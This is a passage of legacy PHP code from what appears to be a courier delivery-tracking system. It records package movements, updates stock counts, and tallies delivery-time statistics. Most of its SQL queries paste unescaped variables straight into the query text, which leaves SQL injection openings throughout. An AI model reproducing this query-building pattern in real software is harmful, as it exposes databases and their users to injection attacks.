		$sql.="'".date('Y-m-d')."'".",";           //06
		$sql.="'".date('H:i:s')."'".",";           //07
		$sql.="'".$_SESSION['IDTRANSP']."'";       //08
		if ($idmotivo){
		$sql.=","."'".$idmotivo."'";		   //09
		}
		if ($codigocourier and $codigocourier > 0){
		$sql.=","."'".$codigocourier."'";	   //10
		}
		if($codbasedestino and $codbasedestino > 0){
		$sql.=","."'".$codbasedestino."'";	   //11
		}
		if(trim($obs_movimento)){
		$sql.=","."'".$obs_movimento."'";	   //12
		}
		$sql.=")";
		*/
		
		//Executa a query
		$qryfunc->executa($sql);
		
		if(!$qryfunc->res)
		return $err[0]=9; //Daniel: esse err=9 eu coloquei soh pra dizer q deu errado
		else{
			
			//Inicio - acrescentado por Daniel
			if($idmovp==180 and ($obs_recuperar_tlmk)){
				$qryfunc->executa("select last_value from tbmovimento_idmovimento_seq");
				$idmovimento_last = $qryfunc->data["last_value"];
				
				$sql="insert into tbobsrecuperar";
				$sql.= "(idinterno".",";                   //01
				$sql.="idmovimento".",";                   //02
				$sql.="obs)";                              //03
				$sql.=" values ";
				$sql.="("."'".$idinterno."'".",";            //01
				$sql.="'".$idmovimento_last."'".",";       //02
				$sql.="'".addslashes(trim($obs_recuperar_tlmk))."'".")";  //03
				//echo "$sql<br>";
				$qryfunc->executa($sql);
				if(!$qryfunc->res)
				return $err[0]=9;
			}
			
			if(($idmovp==135 or $idmovp==136 or $idmovp==137) and trim($obs_recuperar_tlmk)){
				$qryfunc->executa("select last_value from tbmovimento_idmovimento_seq");
				$idmovimento_last = $qryfunc->data["last_value"];
				
				$sql="insert into tbobstelemarketing";
				$sql.= "(idinterno".",";                   //01
				$sql.="idmovimento".",";                   //02
				$sql.="obs)";                              //03
				$sql.=" values ";
				$sql.="("."'".$idinterno."'".",";            //01
				$sql.="'".$idmovimento_last."'".",";       //02
				$sql.="'".addslashes(trim($obs_recuperar_tlmk))."'".")";  //03
				//echo "$sql<br>";
				$qryfunc->executa($sql);
				if(!$qryfunc->res)
				return $err[0]=9;
			}
			
			if($codbasedestino and $codbasedestino > 0){
				//echo "UPDATE tbentrega SET codbase='$codbasedestino' WHERE idinterno='".$idinterno."'<br>";
				$qryfunc->executa("UPDATE tbentrega SET codbase='$codbasedestino' WHERE idinterno='".$idinterno."'");
				if(!$qryfunc->res)
				return $err[0]=9;
			}
			
			if(!(updateentrega($idinterno,$idmovp,$numlista)))
			return $err[0]=9;
			
			//Fim - acrescentado por Daniel
			
		}
		
		return $err[0]=0;
	}
}

/**********************************************/
/*             ACERTA ENTREGA                 */
/**********************************************/
function updateentrega($idinterno,$idmov,$numlista=""){
	$qryfunc = new consulta($con);
	
	$qryfunc->executa("SELECT codtipoestoque FROM tbtipomovimento WHERE idtipomovimento=".$idmov);
	$codtipoestoque = $qryfunc->data["codtipoestoque"];
	
	//Begin
	$sql="";
	$sql.="update"." tbentrega ";
	$sql.= " set ";
	if(trim($numlista)!="" and intval($numlista) > -1)$sql.= " numlista='".intval($numlista)."',";     //03
	if($codtipoestoque > 0)$sql.= " codtipoestoque='$codtipoestoque',";     //04
	$sql.= " dataoperacao"."="."'".date('Y-m-d')."'".", ";   //01
	$sql.= " idtipomovimento"."=".$idmov;     //02
	$sql.= " where idinterno=".$idinterno;
	//echo "$sql<br>";
	//Executa a query
	$qryfunc->executa($sql);
	//End
	//}
	if(!$qryfunc->res)
	return false;
	else
	return true;
	
}

/**********************************************/
/*             FUNÇÕES DE ESTOQUE             */
/**********************************************/

//Movimenta o estoque da base de acordo com as normas desta função
function movimentaestoque($transp, $codcli, $codpro, $codbas,$mov,$qtd_vol=1){
	$estobj = new consulta($con);
	$estobj->executa("select * from tbestoquebase where idtransportadora='$transp' and codcliente='$codcli' and codigoproduto='$codpro' and codbase=".$_SESSION['IDBASE']);
	//               echo "select * from tbestoquebase where idtransportadora='$transp' and codcliente='$codcli' and codigoproduto='$codpro' and codbase=".$_SESSION['IDBASE'];
	//               echo $mov;
	//               Valores ATUAIS
	$atual = $estobj->data["quantidadeatual"];
	$comprometido = $estobj->data["quantidadecomprometida"];
	$sinistro = $estobj->data["quantidadesinistro"];
	$consolidada = $estobj->data["quantidadeconsolidada"];
	$utilizado = $estobj->data["quantidadeutilizado"];
	
	//Protege contra NULOS e BRANCOS nas variaveis
	if($atual=="" || $atual==NULL)
	$atual=0;
	if($comprometido=="" || $comprometido==NULL)
	$comprometido=0;
	if($sinistro=="" || $sinistro==NULL)
	$sinistro=0;
	if($consolidada=="" || $consolidada==NULL)
	$consolidada=0;
	if($utilizado=="" || $utilizado==NULL)
	$utilizado=0;
	
	$qtd_vol = intval($qtd_vol);
	
	switch($mov){
		case 102: //Lista de Entregas     -  INCREMENTA COMPROMETIDO
		$comprometido=$comprometido + $qtd_vol;
		$result = true;
		break;
		case 105: //Baixa como Entregue   -  DEBITA ATUAL E DEBITA COMPROMETIDO
		$atual=$atual - $qtd_vol;
		$comprometido=$comprometido - $qtd_vol;
		$utilizado = $utilizado + $qtd_vol;
		$result = true;
		break;
		case 132: //Baixa como Roubado    -  DEBITA ATUAL E INCREMENTA SINISTRO
		$atual=$atual - $qtd_vol;
		$sinistro=$sinistro + $qtd_vol;
		$utilizado = $utilizado + $qtd_vol;
		$result = true;
		break;
		case 133: //Baixa como Extraviada -   DEBITA ATUAL E INCREMENTA SINISTRO
		$atual=$atual - $qtd_vol;
		$sinistro=$sinistro + $qtd_vol;
		$utilizado = $utilizado + $qtd_vol;
		$result = true;
		break;
		case 150: //Baixa como devolução  -  DEBITA COMPROMETIDO
		$comprometido=$comprometido - $qtd_vol;
		$result = true;
		break;
		case 164: //Lista de COD Conferida pelo Cliente -  INCREMENTA CONSOLIDADA
		$consolidada=$consolidada + $qtd_vol;
		$result = true;
		break;
		case 180: //Encomenda Recuperada  -  DEBITA COMPROMETIDO
		$comprometido=$comprometido - $qtd_vol;
		$result = true;
		break;
		case 400: //Despachado via Correio -  INCREMENTA CONSOLIDADA
		$atual=$atual - $qtd_vol;
		$comprometido=$comprometido - $qtd_vol;
		$utilizado = $utilizado + $qtd_vol;
		$result = true;
		break;
	}
	/*
	echo $comprometido."Comp<br>";
	echo $atual."Atua<br>";
	echo $sinistro."Sin<br><br>";
	echo $estobj->data["quantidadeatual"]."Atua<br>";
	echo $estobj->data["quantidadecomprometida"]."Com<br>";
	echo $estobj->data["quantidadesinistro"]."Sinis<br>";
	*/
	
	$sql = "UPDATE tbestoquebase SET quantidadeatual='$atual', quantidadecomprometida='$comprometido', quantidadesinistro='$sinistro', quantidadeconsolidada='$consolidada', quantidadeutilizado='$utilizado', ultimomovimento='".date('Y-m-d')."' WHERE idtransportadora='$transp' AND codcliente='$codcli' AND codigoproduto='$codpro' AND codbase='".$_SESSION['IDBASE']."'";
	$estobj->executa($sql);
	
	return $result; //boolean
}

/**********************************************/
/*             FUNÇÕES DE MENSURAÇÃO          */
/**********************************************/
function lancamensura ($oper, $transp, $client, $produt, $lote, $cbaixa, $idinterno){
	/*
	echo $oper."<br>";
	echo $transp."<br>";
	echo $client."<br>";
	echo $produt."<br>";
	echo $lote."<br>";
	echo $cbaixa."<br>";
	echo $idinterno."<br>";
	exit;
	*/
	$sql=new consulta($con);
	$sql1=new consulta($con);
	$sql2=new consulta($con);
	
	
	if(!$lote)
	$lote = "null";
	
	switch($oper){
		case 1: // Carga Inicial
		$sql->executa("select numlotecliente from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
		if ($sql->nrw<=0){
			//insert
			$sql->executa("insert into tbmensuracao (idtransportadora,codcliente,codigoproduto,numlotecliente,qtdetotal,qtded1,qtded2,qtded3,qtded4,qtded5,qtded6,qtded7,qtded8,qtdedevolvidas,qtdetele,qtdesinistro,qtderota,datalote)values($transp, $client, $produt, $lote,1,0,0,0,0,0,0,0,0,0,0,0,0,'".date("Y/m/d")."')");
		}else{
			//update
			$sql->executa("select qtdetotal,idtransportadora,codcliente,codigoproduto,numlotecliente from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$qtdetotal = $sql->data["qtdetotal"];
			$qtdetotal=$qtdetotal+1;
			$sql1->executa("update tbmensuracao set qtdetotal=$qtdetotal where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
		}
		break;
		
		case 2: // Manipulação
		
		switch($cbaixa){
			case 105: //Entregues => Dif. entre datas (dataentrega-datacoletado)
			//identifica a encomenda
			$sql->executa("select dataentrega, datacoletado from tbentrega where idinterno = $idinterno");
			$dtaentrega =  $sql->data["dataentrega"];
			$dtacoleta  =  $sql->data["datacoletado"];
			$dtaentrega = converte_data("$dtaentrega");
			$dtacoleta  = converte_data("$dtacoleta");
			$dias  = date_dif($dtacoleta,$dtaentrega);
			//   echo $dtaentrega;
			//        echo $dtacoleta;
			//        echo $dias;
			switch($dias){
				case 1:
				$sql->executa("select qtded1 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded1"];
				$parcial=$parcial+1;
				$sql2->executa("update tbmensuracao set qtded1=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 2:
				$sql->executa("select qtded2 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded2"];
				$parcial = $parcial+1;
				$sql2->executa("update tbmensuracao set qtded2=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				//                   echo ("update tbmensuracao set qtded2=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 3:
				$sql->executa("select qtded3 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded3"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded3=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 4:
				$sql->executa("select qtded4 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded4"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded4=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 5:
				$sql->executa("select qtded5 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded5"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded5=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 6:
				$sql->executa("select qtded6 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded6"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded6=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 7:
				$sql->executa("select qtded7 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded7"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded7=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				case 8:
				$sql->executa("select qtded8 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
				$parcial = $sql->data["qtded8"];
				$parcial = $parcial + 1;
				$sql2->executa("update tbmensuracao set qtded8=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				break;
				default:
				if ($dias<1){
					$sql->executa("select qtded1 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
					$parcial = $sql->data["qtded1"];
					$parcial = $parcial + 1;
					$sql2->executa("update tbmensuracao set qtded1=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				}else if ($dias>8){
					$sql->executa("select qtded8 from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
					$parcial = $sql->data["qtded8"];
					$parcial = $parcial + 1;
					$sql2->executa("update tbmensuracao set qtded8=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
				}
				break;
				
			}
			break;
			case 150: //Devolvidas
			$sql->executa("select qtdedevolvidas from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdedevolvidas"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdedevolvidas=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			
			break;
			case 132://Roubo
			$sql->executa("select qtdesinistro from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdesinistro"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdesinistro=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
			break;
			case 133://Extravio
			$sql->executa("select qtdesinistro from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdesinistro"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdesinistro=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
			break;
			case 135:
			//telemarketing
			$sql->executa("select qtdetele from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdetele"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdetele=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
			break;
			case 136:
			//telemarketing
			$sql->executa("select qtdetele from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdetele"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdetele=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
			break;
			case 137://telemarketing
			$sql->executa("select qtdetele from tbmensuracao where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull"));
			$parcial=$sql->data["qtdetele"];
			$parcial=$parcial+1;
			$sql2->executa("update tbmensuracao set qtdetele=$parcial where idtransportadora=$transp and codcliente=$client and codigoproduto=$produt and numlotecliente".(($lote and $lote!="null")?"='$lote'":" isnull")); //atualiza o registro
			break;
		}
		break;
	}
	
	
}


?>
